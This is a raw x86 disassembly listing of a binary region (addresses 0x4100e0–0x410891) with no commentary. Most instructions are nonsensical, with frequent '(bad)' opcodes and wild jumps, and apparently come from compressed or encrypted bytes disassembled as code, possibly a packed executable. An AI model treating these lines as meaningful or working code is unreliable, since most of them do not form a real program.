  4100e0:	add    al,0xf3
  4100e2:	fdivr  st(1),st
  4100e4:	lods   eax,DWORD PTR ds:[esi]
  4100e5:	lds    esi,FWORD PTR [ecx-0x1d]
  4100e8:	stc    
  4100e9:	int    0xed
  4100eb:	int3   
  4100ec:	lock out dx,eax
  4100ee:	rcl    BYTE PTR [edi+0x4],0x3b
  4100f2:	cmp    dl,bl
  4100f4:	add    BYTE PTR [esi],dh
  4100f6:	mov    al,0x1b
  4100f8:	ss icebp 
  4100fa:	sbb    eax,0xf677bed2
  4100ff:	or     BYTE PTR [ecx+0x2d],bl
  410102:	jecxz  0x410099
  410104:	push   edi
  410105:	add    bl,BYTE PTR [edx]
  410107:	cmp    ebx,DWORD PTR [ebx+0x4e]
  41010a:	(bad)  
  41010b:	(bad)  
  41010c:	gs jnp 0x41010c
  41010f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410110:	fsubr  QWORD PTR [edx+0xd87ba71]
  410116:	retf   0x9bb5
  410119:	dec    BYTE PTR [ebx+eiz*1+0x43]
  41011d:	cs inc esi
  41011f:	mov    esi,0x1a164dd8
  410124:	fwait
  410125:	retf   
  410126:	out    0x87,al
  410128:	outs   dx,DWORD PTR ds:[esi]
  410129:	js     0x41018c
  41012b:	pop    eax
  41012c:	sub    cl,BYTE PTR [edx+0x72]
  41012f:	dec    esi
  410130:	push   esi
  410131:	jp     0x4100df
  410133:	fld    DWORD PTR [esi+edx*1-0x55]
  410137:	mov    esp,0x8a593ec3
  41013c:	or     bh,BYTE PTR [ecx]
  41013e:	push   ds
  41013f:	not    al
  410141:	stos   DWORD PTR es:[edi],eax
  410142:	jmp    0x4101a9
  410144:	fbld   TBYTE PTR [edx-0x4cf5ea25]
  41014a:	int3   
  41014b:	in     eax,0x88
  41014d:	js     0x4101a5
  41014f:	adc    BYTE PTR fs:[ecx+0x1c],0x55
  410154:	pop    es
  410155:	ss adc cl,0xfa
  410159:	pop    eax
  41015a:	scas   al,BYTE PTR es:[edi]
  41015b:	js     0x410117
  41015d:	or     cl,BYTE PTR [ecx]
  41015f:	add    al,0x85
  410161:	neg    DWORD PTR [ebx*8-0x6669d87b]
  410168:	mov    dh,0x1d
  41016a:	repz leave 
  41016c:	dec    ebp
  41016d:	jmp    0x7316:0xc73d69e2
  410174:	jae    0x41018e
  410176:	or     BYTE PTR [ebx+0x7aca97aa],al
  41017c:	dec    eax
  41017d:	jno    0x41012c
  41017f:	mov    al,ds:0xd041674
  410184:	push   edi
  410185:	pop    ecx
  410186:	test   BYTE PTR [ebx],dl
  410188:	sar    DWORD PTR [ecx+ebp*1],cl
  41018b:	push   cs
  41018c:	adc    bh,BYTE PTR [ebx-0x51b33ca4]
  410192:	dec    esi
  410193:	lods   eax,DWORD PTR ds:[esi]
  410194:	push   ebp
  410195:	adc    BYTE PTR [eax+0x3342209f],ch
  41019b:	sbb    ah,BYTE PTR [edx+0x19]
  41019e:	(bad)  
  41019f:	cmp    DWORD PTR [edi-0x4c],esp
  4101a2:	and    al,0x60
  4101a4:	sbb    ah,BYTE PTR [edi+ebp*8+0x5b]
  4101a8:	mov    edi,esi
  4101aa:	cmp    al,0x8d
  4101ac:	xor    eax,0xb9971bbe
  4101b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b2:	mov    ebp,DWORD PTR [edi]
  4101b4:	dec    ebx
  4101b5:	cdq    
  4101b6:	test   BYTE PTR [eax+0x721b75b0],cl
  4101bc:	pushf  
  4101bd:	leave  
  4101be:	adc    al,0xcf
  4101c0:	mov    esp,0xaa7d1f34
  4101c5:	(bad)  
  4101c6:	and    ch,al
  4101c8:	lock mov ch,BYTE PTR [eax]
  4101cb:	sbb    edi,DWORD PTR [ecx+0x45]
  4101ce:	jne    0x4101c1
  4101d0:	xchg   DWORD PTR [esi-0x20],ebp
  4101d3:	cmp    ch,cl
  4101d5:	daa    
  4101d6:	lea    ecx,[ebx-0x4a839036]
  4101dc:	inc    ecx
  4101dd:	cld    
  4101de:	retf   0xd035
  4101e1:	jb     0x4101d9
  4101e3:	mov    edx,0xc6bd46eb
  4101e8:	ds cwde 
  4101ea:	jecxz  0x4101a5
  4101ec:	cmp    esi,esp
  4101ee:	push   esi
  4101ef:	idiv   DWORD PTR [esi]
  4101f1:	adc    eax,0x2d79e651
  4101f6:	inc    ebp
  4101f7:	jo     0x410263
  4101f9:	aam    0xfb
  4101fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101fc:	cmp    ah,BYTE PTR [eax+0x1855cfe3]
  410202:	inc    edx
  410203:	sbb    eax,0x60822b14
  410208:	ror    BYTE PTR [ebx+0xd30978b],1
  41020e:	fmul   st,st(3)
  410210:	aas    
  410211:	xchg   edi,eax
  410212:	popf   
  410213:	add    DWORD PTR ds:0x9c945787,edi
  410219:	loopne 0x41019c
  41021b:	fsub   DWORD PTR [ebx+0x1c]
  41021e:	add    eax,0x8cfc103
  410223:	in     al,dx
  410224:	xlat   BYTE PTR ds:[ebx]
  410225:	jmp    0x410262
  410227:	xor    al,0xf2
  410229:	jns    0x410290
  41022b:	sbb    dl,BYTE PTR [esi]
  41022d:	shr    BYTE PTR [esi-0x51bbc257],1
  410233:	jae    0x4102b4
  410235:	jno    0x4102b0
  410237:	mov    ds:0xe1ce47bc,al
  41023c:	push   esp
  41023d:	stc    
  41023e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41023f:	and    DWORD PTR [edx-0x494597d7],ecx
  410245:	inc    BYTE PTR [edi-0x64]
  410248:	mov    ch,0xc3
  41024a:	ins    DWORD PTR es:[edi],dx
  41024b:	les    edx,FWORD PTR [ebx+0x6ece2dbf]
  410251:	and    DWORD PTR [ecx],esp
  410253:	ror    DWORD PTR ss:[esi+0x5b3adf63],1
  41025a:	jp     0x41024b
  41025c:	and    BYTE PTR [eax],ch
  41025e:	sbb    edx,edi
  410260:	dec    ecx
  410261:	rol    BYTE PTR [ecx],cl
  410263:	rol    DWORD PTR [ecx+edi*2-0x7aee9642],0x71
  41026b:	div    BYTE PTR [ecx]
  41026d:	loope  0x41020d
  41026f:	pop    ecx
  410270:	cmp    al,0xcb
  410272:	rcl    esi,1
  410274:	test   eax,0x87fd1103
  410279:	push   esp
  41027a:	or     ecx,eax
  41027c:	arpl   sp,cx
  41027e:	inc    ecx
  41027f:	dec    esi
  410280:	xor    eax,0x5b014288
  410285:	rcr    DWORD PTR [eax],cl
  410287:	sbb    esp,ebx
  410289:	cdq    
  41028a:	test   BYTE PTR [ebp+0x4ac957c],bl
  410290:	sbb    eax,0xb4db9f26
  410295:	bound  edx,QWORD PTR [ebp-0xc]
  410298:	std    
  410299:	outs   dx,BYTE PTR ds:[esi]
  41029a:	inc    ecx
  41029b:	inc    esi
  41029c:	dec    ebp
  41029d:	cmp    DWORD PTR [eax],edx
  41029f:	ds mov cl,0xe4
  4102a2:	ret    
  4102a3:	nop
  4102a4:	scas   eax,DWORD PTR es:[edi]
  4102a5:	arpl   cx,dx
  4102a7:	mov    dh,0x3c
  4102a9:	sub    al,0x5c
  4102ab:	test   al,0x35
  4102ad:	mov    WORD PTR [ebp-0x2e565b87],?
  4102b3:	idiv   DWORD PTR [ecx+edx*2]
  4102b6:	mov    cl,0xb3
  4102b8:	and    edi,ebx
  4102ba:	popf   
  4102bb:	sar    cl,cl
  4102bd:	in     eax,dx
  4102be:	call   0x39a435a5
  4102c3:	cmp    cl,BYTE PTR [eax]
  4102c5:	mov    eax,ds:0xeb6ee026
  4102ca:	data16 sbb BYTE PTR ds:[ecx+ecx*8-0x48eabdac],cl
  4102d3:	or     bh,BYTE PTR [ebp+eax*8+0x40e98bc0]
  4102da:	lea    esi,[ebx+0x37]
  4102dd:	and    dl,ah
  4102df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102e0:	xchg   esp,eax
  4102e1:	dec    ebx
  4102e2:	or     al,al
  4102e4:	pushf  
  4102e5:	jl     0x410323
  4102e7:	ins    BYTE PTR es:[edi],dx
  4102e8:	in     eax,dx
  4102e9:	sub    BYTE PTR [esi-0xc],0x97
  4102ed:	imul   ebp,edi,0xbdc4ae50
  4102f3:	pusha  
  4102f4:	lds    ebx,FWORD PTR fs:[edi+0xa29c893]
  4102fb:	outs   dx,BYTE PTR ds:[esi]
  4102fc:	jle    0x41035b
  4102fe:	mov    WORD PTR [esi-0x3f09cab1],gs
  410304:	inc    esp
  410305:	jns    0x410335
  410307:	lahf   
  410308:	push   esp
  410309:	adc    al,0x4c
  41030b:	cdq    
  41030c:	daa    
  41030d:	fdivr  DWORD PTR [esp+ebx*8+0x240ae274]
  410314:	or     al,0x21
  410316:	les    edi,FWORD PTR [ecx+0x47]
  410319:	sti    
  41031a:	xchg   BYTE PTR [edi+edi*1+0x30],ch
  41031e:	daa    
  41031f:	lock dec edx
  410321:	lea    ebx,[esi-0x299bf615]
  410327:	imul   esi,ebp,0xffffffdd
  41032a:	mov    al,ds:0x5b4ede2f
  41032f:	mov    eax,ds:0x715599d9
  410334:	add    bh,BYTE PTR [esi+eiz*8+0x46050e85]
  41033b:	jo     0x41031b
  41033d:	or     al,0x8e
  41033f:	push   ecx
  410340:	sub    ah,cl
  410342:	mov    dl,0x6d
  410344:	mov    BYTE PTR [esi-0x8],bh
  410347:	sar    bh,0xf8
  41034a:	jno    0x4102d5
  41034c:	aam    0x4b
  41034e:	add    DWORD PTR [esi-0x70],eax
  410351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410352:	xlat   BYTE PTR ds:[ebx]
  410353:	in     eax,dx
  410354:	(bad)  
  410355:	into   
  410356:	mov    al,0x75
  410358:	xor    ebx,DWORD PTR [edx-0x9feedf5]
  41035e:	xor    BYTE PTR [ebp+0x3dac1f4d],bh
  410364:	dec    esi
  410365:	fistp  WORD PTR [ecx+0x0]
  410368:	mov    ebx,0xc80c0b64
  41036d:	mov    ds:0x9e13be26,eax
  410372:	xor    DWORD PTR [edx],ebp
  410374:	jbe    0x410333
  410376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410377:	repnz mov edx,0x5da4e91e
  41037d:	dec    ebx
  41037e:	xor    eax,0xc60e797b
  410383:	sub    esi,0xee09ecf8
  410389:	sub    al,ah
  41038b:	arpl   WORD PTR [ebp+0x5a],bp
  41038e:	call   0x94db75e
  410393:	and    al,BYTE PTR [esi-0x77]
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd85
  4103a6:	add    ecx,DWORD PTR ds:0x42fd89
  4103ac:	mov    DWORD PTR ds:0x42fd85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e19c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xc168:0xa4cabab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    ebx,0x398c5e36
  4103df:	std    
  4103e0:	xlat   BYTE PTR ds:[ebx]
  4103e1:	push   esi
  4103e2:	add    al,0x19
  4103e4:	cmp    eax,0x3ec2a3c5
  4103e9:	pop    es
  4103ea:	clc    
  4103eb:	xchg   DWORD PTR [edx+eiz*2],ecx
  4103ee:	(bad)  
  4103ef:	push   ds
  4103f0:	dec    ecx
  4103f1:	lock (bad) 
  4103f3:	fdivr  st,st(2)
  4103f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103f6:	dec    esp
  4103f7:	fdiv   QWORD PTR [ebx+eax*2+0x4c]
  4103fb:	jl     0x410417
  4103fd:	inc    ecx
  4103fe:	xchg   edi,edi
  410400:	push   ecx
  410401:	xchg   ecx,eax
  410402:	xchg   ebp,eax
  410403:	(bad)  
  410404:	cld    
  410405:	and    bh,BYTE PTR [esi]
  410407:	xchg   al,ah
  410409:	add    al,0xeb
  41040b:	mov    ?,edi
  41040d:	or     esp,DWORD PTR [esi+esi*2-0x2e]
  410411:	repz mov ebp,0xc42e4d44
  410417:	fcomp  DWORD PTR [ebp-0xc]
  41041a:	or     BYTE PTR [edi],dl
  41041c:	jbe    0x4103cf
  41041e:	loop   0x410441
  410420:	xor    esp,DWORD PTR [ecx+0x5c63855d]
  410426:	dec    esp
  410427:	les    ecx,FWORD PTR [ebx+0x4e]
  41042a:	fs push 0x67
  41042d:	jge    0x4103bc
  41042f:	imul   ecx,DWORD PTR [ecx-0x79],0x1fa0a4cd
  410436:	sbb    bl,BYTE PTR [edx]
  410438:	mov    es,WORD PTR [edx+0x42]
  41043b:	ins    BYTE PTR es:[edi],dx
  41043c:	fbld   TBYTE PTR [ecx]
  41043e:	clc    
  41043f:	ds aaa 
  410441:	dec    ecx
  410442:	jl     0x410463
  410444:	push   esi
  410445:	ja     0x41045c
  410447:	sbb    BYTE PTR [ebx-0x2c272e2],al
  41044d:	sbb    dl,BYTE PTR [edx+edi*1]
  410450:	dec    eax
  410451:	adc    BYTE PTR [edx-0x7cfeb404],ah
  410457:	unpcklps xmm6,XMMWORD PTR [ebp+edx*8+0x48117f06]
  41045f:	fbstp  TBYTE PTR [esp+edi*4]
  410462:	xchg   ebx,eax
  410463:	jle    0x4104d6
  410465:	es add edi,esp
  410468:	and    al,0x21
  41046a:	and    eax,0xac5ad7a6
  41046f:	(bad)  
  410470:	cld    
  410471:	cld    
  410472:	daa    
  410473:	fmul   st,st(5)
  410475:	pop    ebx
  410476:	pop    ss
  410477:	push   esp
  410478:	pop    esp
  410479:	cmp    al,0x83
  41047b:	(bad)  
  41047c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41047d:	cli    
  41047e:	ret    
  41047f:	xor    bl,ch
  410481:	pop    DWORD PTR [ecx-0xe]
  410484:	xchg   ecx,eax
  410485:	push   edi
  410486:	fdiv   QWORD PTR [esp+edi*1]
  410489:	cmp    eax,0x8cbe7e75
  41048e:	cmc    
  41048f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410490:	xchg   esi,eax
  410491:	arpl   WORD PTR ds:0x62fbcdce,bx
  410497:	lock xor cl,al
  41049a:	cmp    ebx,DWORD PTR [ecx+esi*2]
  41049d:	out    0xeb,al
  41049f:	mov    esp,esi
  4104a1:	mov    bh,0xb0
  4104a3:	pop    ebx
  4104a4:	jmp    0x218453a1
  4104a9:	dec    esi
  4104aa:	hlt    
  4104ab:	mov    ebp,0x9359717c
  4104b0:	sti    
  4104b1:	das    
  4104b2:	mov    esp,DWORD PTR [ecx-0x58204bf4]
  4104b8:	ds dec ecx
  4104ba:	outs   dx,DWORD PTR ds:[esi]
  4104bb:	and    BYTE PTR [edx-0x3b],bl
  4104be:	repz iret 
  4104c0:	add    eax,0x4a0d9ec2
  4104c5:	stc    
  4104c6:	fs dec ebp
  4104c8:	mov    ch,0x75
  4104ca:	inc    ecx
  4104cb:	jl     0x41048a
  4104cd:	mov    dh,0x47
  4104cf:	xchg   ebp,eax
  4104d0:	push   ebx
  4104d1:	repnz push ds
  4104d3:	in     eax,dx
  4104d4:	mov    al,es:0xd540a85
  4104da:	add    eax,0x843b2752
  4104df:	sub    esi,DWORD PTR [edx-0x20]
  4104e2:	stc    
  4104e3:	bound  eax,QWORD PTR [esi-0xe]
  4104e6:	cmp    bl,bl
  4104e8:	cmp    BYTE PTR [esi+0x163ebece],al
  4104ee:	popf   
  4104ef:	sbb    ch,BYTE PTR [edi]
  4104f1:	inc    ecx
  4104f2:	adc    edi,DWORD PTR [edx-0x71]
  4104f5:	and    DWORD PTR [esi],0x42
  4104f8:	push   ebp
  4104f9:	cld    
  4104fa:	test   al,0x9b
  4104fc:	add    dh,BYTE PTR [ebx+0x2a]
  4104ff:	in     eax,0x5a
  410501:	aam    0xe6
  410503:	mov    ebp,0x4235676f
  410508:	sbb    esp,DWORD PTR [eax+ebx*2-0x45]
  41050c:	iret   
  41050d:	ja     0x4104d4
  41050f:	data16 outs dx,BYTE PTR ds:[esi]
  410511:	lock scas al,BYTE PTR es:[edi]
  410513:	mov    ?,WORD PTR [edx]
  410515:	stos   DWORD PTR es:[edi],eax
  410516:	dec    ebx
  410517:	aam    0x5
  410519:	sahf   
  41051a:	sub    dl,bl
  41051c:	iret   
  41051d:	loopne 0x410516
  41051f:	inc    ebp
  410520:	pop    ss
  410521:	shr    BYTE PTR ds:0x3cbccf00,0x67
  410528:	push   0x4b
  41052a:	add    ch,BYTE PTR [eax]
  41052c:	shr    al,1
  41052e:	add    al,BYTE PTR [edx]
  410530:	hlt    
  410531:	ins    BYTE PTR es:[edi],dx
  410532:	(bad)  
  410533:	mov    eax,ds:0x21332269
  410538:	fwait
  410539:	ja     0x41053c
  41053b:	ror    BYTE PTR [edi+0x7a],cl
  41053e:	aad    0x42
  410540:	bound  esi,QWORD PTR [ebp+edx*8-0x16dd7495]
  410547:	push   ebp
  410548:	call   0xe7b357f1
  41054d:	repz pusha 
  41054f:	int    0x89
  410551:	ror    esi,cl
  410553:	sbb    BYTE PTR [edx],ah
  410555:	add    dh,bl
  410557:	and    al,BYTE PTR [esi-0x79]
  41055a:	idiv   DWORD PTR [edx-0x1e7b0d46]
  410560:	ja     0x41051a
  410562:	(bad)  
  410563:	aas    
  410564:	adc    al,0x47
  410566:	inc    edx
  410567:	dec    edx
  410568:	out    dx,eax
  410569:	dec    eax
  41056a:	jge    0x41051d
  41056c:	int3   
  41056d:	sbb    eax,0xb5f2d93
  410572:	cmp    DWORD PTR [eax],0x796cc1e0
  410578:	(bad)  [esi-0x52]
  41057b:	pop    ecx
  41057c:	shl    DWORD PTR [eax],cl
  41057e:	push   ebp
  41057f:	mov    esi,0xc1ef1637
  410584:	sbb    edx,edi
  410586:	xchg   edi,eax
  410587:	shl    ebx,1
  410589:	inc    edx
  41058a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058b:	ror    DWORD PTR [edx+0x4d],1
  41058e:	push   edx
  41058f:	adc    eax,0x79c3c1de
  410594:	gs aaa 
  410596:	mov    ecx,0xc05d4d3a
  41059b:	xor    ah,BYTE PTR gs:[ebx-0x672d8c91]
  4105a2:	mov    edx,DWORD PTR [esi+ebp*4-0x60]
  4105a6:	xchg   ebx,eax
  4105a7:	inc    ecx
  4105a8:	add    eax,0xdb289498
  4105ad:	cdq    
  4105ae:	cmp    eax,0x7e64a6b1
  4105b3:	xlat   BYTE PTR ds:[ebx]
  4105b4:	int3   
  4105b5:	cmp    DWORD PTR [edx-0x27bbf4a0],edx
  4105bb:	or     esi,esi
  4105bd:	inc    ebx
  4105be:	sbb    cl,BYTE PTR [eax+0x25]
  4105c1:	adc    edi,DWORD PTR [esi+0x52]
  4105c4:	(bad)  
  4105c5:	cmp    eax,0xae150164
  4105ca:	pop    ecx
  4105cb:	and    eax,0x66eac673
  4105d0:	and    eax,0x98f4393c
  4105d5:	mov    edi,0x4b7274cf
  4105da:	(bad)  
  4105db:	fsub   QWORD PTR [ebx+0x2d]
  4105de:	xor    eax,esp
  4105e0:	mov    DWORD PTR [eax+0x7b],edi
  4105e3:	div    eax
  4105e5:	aad    0xf1
  4105e7:	or     BYTE PTR [edx+0x7b],cl
  4105ea:	sar    DWORD PTR [ebx],0xb8
  4105ed:	js     0x410660
  4105ef:	(bad)  
  4105f0:	loop   0x410578
  4105f2:	jg     0x4105ea
  4105f4:	or     edx,DWORD PTR [ecx-0x78]
  4105f7:	out    0x2e,eax
  4105f9:	call   FWORD PTR [edx+eax*1]
  4105fc:	sbb    BYTE PTR [eax-0x4ed2791b],cl
  410602:	add    eax,0x9880930c
  410607:	aaa    
  410608:	(bad)  
  410609:	lods   eax,DWORD PTR ds:[esi]
  41060a:	push   esp
  41060b:	test   DWORD PTR [eax-0x6a],ebp
  41060e:	scas   al,BYTE PTR es:[edi]
  41060f:	pop    DWORD PTR [ebx-0x2e14553d]
  410615:	repnz push 0x68a867d1
  41061b:	pop    ebx
  41061c:	pushf  
  41061d:	call   0xbb56ce99
  410622:	repz sbb bh,BYTE PTR [edi-0x45a9f5ac]
  410629:	rcl    BYTE PTR [ebp+0x431e254e],cl
  41062f:	ficomp WORD PTR [ecx+0x27]
  410632:	mov    cl,0x4c
  410634:	xchg   edx,eax
  410635:	fcom   QWORD PTR [eax+edx*4+0xf]
  410639:	bnd ret 
  41063b:	dec    ebp
  41063c:	xchg   ecx,esi
  41063e:	mov    ecx,0x579cf436
  410643:	mov    ebp,0x237d2e46
  410648:	lds    eax,FWORD PTR [edx-0x26d4a832]
  41064e:	test   BYTE PTR [edx],bl
  410650:	xchg   ebx,eax
  410651:	inc    edx
  410652:	xlat   BYTE PTR ds:[ebx]
  410653:	and    BYTE PTR [edx+0x7e2bae15],0x1a
  41065a:	pop    ds
  41065b:	adc    esi,ebx
  41065d:	mov    bl,0x99
  41065f:	ficom  WORD PTR [edi]
  410661:	pop    edi
  410662:	inc    ebp
  410663:	and    eax,0x51adcad
  410668:	dec    eax
  410669:	lods   eax,DWORD PTR ds:[esi]
  41066a:	test   al,0x46
  41066c:	imul   esi,ebx,0x90d67e62
  410672:	cs sbb al,0x1c
  410675:	ret    
  410676:	outs   dx,BYTE PTR ds:[esi]
  410677:	inc    esi
  410678:	jo     0x4106c3
  41067a:	or     bh,BYTE PTR [ecx-0x3]
  41067d:	xchg   DWORD PTR [ebx],esi
  41067f:	outs   dx,BYTE PTR ds:[esi]
  410680:	or     bh,al
  410682:	aaa    
  410683:	xchg   ebp,ebp
  410685:	jns    0x410613
  410687:	int3   
  410688:	stos   BYTE PTR es:[edi],al
  410689:	pop    ds
  41068a:	inc    eax
  41068b:	sbb    ecx,DWORD PTR [ecx+edx*2-0x67]
  41068f:	xchg   DWORD PTR [ecx],ebp
  410691:	fisttp QWORD PTR [ecx]
  410693:	xchg   ebp,eax
  410694:	pop    edi
  410695:	push   ebx
  410696:	xor    BYTE PTR [esi],0xe8
  410699:	fiadd  DWORD PTR [ecx]
  41069b:	jne    0x410711
  41069d:	fs loop 0x410685
  4106a0:	repnz popf 
  4106a2:	mov    ecx,0x327d76a5
  4106a7:	std    
  4106a8:	add    ebx,DWORD PTR [edi+0x4a2b8764]
  4106ae:	ja     0x4106d4
  4106b0:	ficomp WORD PTR [ecx]
  4106b2:	pop    ebp
  4106b3:	iret   
  4106b4:	xlat   BYTE PTR ds:[ebx]
  4106b5:	adc    eax,0xd373f53b
  4106ba:	rcr    esi,cl
  4106bc:	cmp    al,0xb3
  4106be:	add    esi,DWORD PTR [ebx+esi*4-0x48]
  4106c2:	dec    edi
  4106c3:	aas    
  4106c4:	ss sahf 
  4106c6:	xchg   esi,eax
  4106c7:	cmp    al,0x13
  4106c9:	and    dh,BYTE PTR [edi]
  4106cb:	add    DWORD PTR [ebx],edx
  4106cd:	and    eax,0x6919945
  4106d2:	cdq    
  4106d3:	adc    al,0x3
  4106d5:	mov    ds:0x32e1c5ab,eax
  4106da:	xchg   esi,eax
  4106db:	dec    DWORD PTR [edi]
  4106dd:	cmp    ebx,DWORD PTR [ebp-0x69c1175e]
  4106e3:	or     eax,esp
  4106e5:	and    DWORD PTR [esp+esi*2-0x4196f068],0x5
  4106ed:	int    0xbd
  4106ef:	popa   
  4106f0:	xlat   BYTE PTR ds:[ebx]
  4106f1:	out    0x36,al
  4106f3:	lock pop esp
  4106f5:	in     al,dx
  4106f6:	push   0xffffffb8
  4106f8:	mov    edi,0x55b29802
  4106fd:	mov    ch,0xdb
  4106ff:	in     al,dx
  410700:	stos   BYTE PTR es:[edi],al
  410701:	js     0x410760
  410703:	jg     0x410748
  410705:	jmp    0x15ef:0xd2a2e6e6
  41070c:	dec    edi
  41070d:	inc    edx
  41070e:	sub    BYTE PTR [ebp-0x7f],0x3f
  410712:	enter  0x628b,0xe2
  410716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410717:	inc    esp
  410718:	jnp    0x410749
  41071a:	leave  
  41071b:	lock cmp DWORD PTR [edi],0x41
  41071f:	sbb    bl,BYTE PTR [ecx-0x2e4ba845]
  410725:	sar    bh,cl
  410727:	aaa    
  410728:	and    al,BYTE PTR [edi+0x74]
  41072b:	xor    BYTE PTR [ebx],0x8d
  41072e:	pop    ebx
  41072f:	or     bl,al
  410731:	out    dx,al
  410732:	jge    0x4106c5
  410734:	add    DWORD PTR [ebx-0x1e0dc563],0xffffff97
  41073b:	loopne 0x41077e
  41073d:	imul   eax,DWORD PTR [ebx-0x19],0x6b57fc75
  410744:	push   ss
  410745:	aaa    
  410746:	retf   
  410747:	fsubr  DWORD PTR [ebp-0x57fce5dd]
  41074d:	imul   ecx,DWORD PTR [eax+0x20],0x69
  410751:	push   cs
  410752:	inc    edi
  410753:	or     ch,BYTE PTR [ebp+ecx*4-0x29]
  410757:	bound  esi,QWORD PTR [ebp+0x733ea259]
  41075d:	push   ds
  41075e:	and    edx,DWORD PTR [esi]
  410760:	and    edx,eax
  410762:	pop    ebp
  410763:	lahf   
  410764:	stos   BYTE PTR es:[edi],al
  410765:	jnp    0x410775
  410767:	push   ebx
  410768:	scas   eax,DWORD PTR es:[edi]
  410769:	add    al,0x2c
  41076b:	xchg   esi,eax
  41076c:	mov    cl,0x22
  41076e:	cmp    DWORD PTR [esi-0x36f72318],0xffffffed
  410775:	inc    esi
  410776:	rcl    dl,0xd
  410779:	int    0x40
  41077b:	retf   
  41077c:	test   cl,al
  41077e:	or     BYTE PTR [ebx],cl
  410780:	or     al,0x6a
  410782:	push   esi
  410783:	and    DWORD PTR [esp+edi*2+0x8758b45],esi
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	(bad)  
  4107a9:	popf   
  4107aa:	jbe    0x4107b9
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x4107d3
  4107b5:	shl    BYTE PTR [esi+0x3d],1
  4107b8:	fisttp WORD PTR [edx-0xe9500e3]
  4107be:	pop    esp
  4107bf:	xlat   BYTE PTR ds:[ebx]
  4107c0:	(bad)  
  4107c1:	jecxz  0x410743
  4107c3:	mov    dl,0xf5
  4107c5:	sub    dh,BYTE PTR [eax]
  4107c7:	lds    edi,FWORD PTR [ecx]
  4107c9:	pushf  
  4107ca:	ins    BYTE PTR es:[edi],dx
  4107cb:	push   0x60
  4107cd:	sub    cl,BYTE PTR [ebp-0x4cd3d320]
  4107d3:	jmp    0xe0c77ebd
  4107d8:	(bad)
  4107db:	pop    edx
  4107dc:	sub    eax,0xa791c47e
  4107e1:	leave  
  4107e2:	das    
  4107e3:	sar    BYTE PTR [edi+0x2bed95d5],1
  4107e9:	push   edi
  4107ea:	jae    0x410807
  4107ec:	rcr    DWORD PTR [ebp+0x7d],0xf
  4107f0:	stos   BYTE PTR es:[edi],al
  4107f1:	aad    0xf0
  4107f3:	mov    bl,0x0
  4107f5:	lea    ecx,[edx-0x9dfb72d]
  4107fb:	(bad)  
  4107fc:	mov    edi,0x44f741c
  410801:	mov    ebx,ds
  410803:	cmp    ecx,DWORD PTR [edi-0x6e]
  410806:	mov    esp,0xe266cfc7
  41080b:	mov    cl,0x9f
  41080d:	cmp    BYTE PTR [edx-0x156fe5ea],bh
  410813:	leave  
  410814:	sbb    eax,0x9d525c14
  410819:	pop    esi
  41081a:	in     eax,dx
  41081b:	add    eax,0xc8648e5b
  410820:	ss mov bl,0x91
  410823:	jl     0x410861
  410825:	inc    ecx
  410826:	push   ss
  410827:	dec    ebp
  410828:	fdivp  st(1),st
  41082a:	xchg   bh,bh
  41082c:	stos   BYTE PTR es:[edi],al
  41082d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41082e:	fisubr WORD PTR [ebp+0x3b]
  410831:	pop    esp
  410832:	not    BYTE PTR [esi+ebp*1+0x7f]
  410836:	sub    al,0x68
  410838:	loop   0x41087d
  41083a:	aam    0x5f
  41083c:	hlt    
  41083d:	fistp  DWORD PTR [esi-0x21]
  410840:	inc    esp
  410841:	mov    bh,0x42
  410843:	cmp    eax,0xbf5e6fc3
  410848:	xchg   BYTE PTR [eax+0x5e],dl
  41084b:	xor    eax,0xc2edf1df
  410850:	pop    esp
  410851:	lds    eax,FWORD PTR [ebx]
  410853:	cld    
  410854:	jge    0x410820
  410856:	fist   DWORD PTR [ecx+0xe]
  410859:	xchg   dl,bh
  41085b:	push   0xffffff94
  41085d:	(bad)  
  41085e:	ins    DWORD PTR es:[edi],dx
  41085f:	and    al,0xb1
  410861:	out    dx,eax
  410862:	cli    
  410863:	pop    ss
  410864:	push   edx
  410865:	repnz fimul WORD PTR [edi]
  410868:	add    dl,BYTE PTR [ecx]
  41086a:	and    cl,BYTE PTR [edi+edi*8+0xb6e2963]
  410871:	daa    
  410872:	in     al,dx
  410873:	push   ss
  410874:	adc    BYTE PTR [ecx],0x75
  410877:	jg     0x41083e
  410879:	mov    ds:0xd0e3d738,al
  41087e:	inc    ebp
  41087f:	sub    bh,bl
  410881:	sub    eax,0x21b0dcda
  410886:	mov    WORD PTR [edi-0x5d],?
  410889:	dec    esi
  41088a:	jp     0x410850
  41088c:	(bad)  
  41088e:	jne    0x4108b0
  410890:	int3   
  410891:	cmp    eax,DWORD PTR [ebx+0x6d8c0e89]
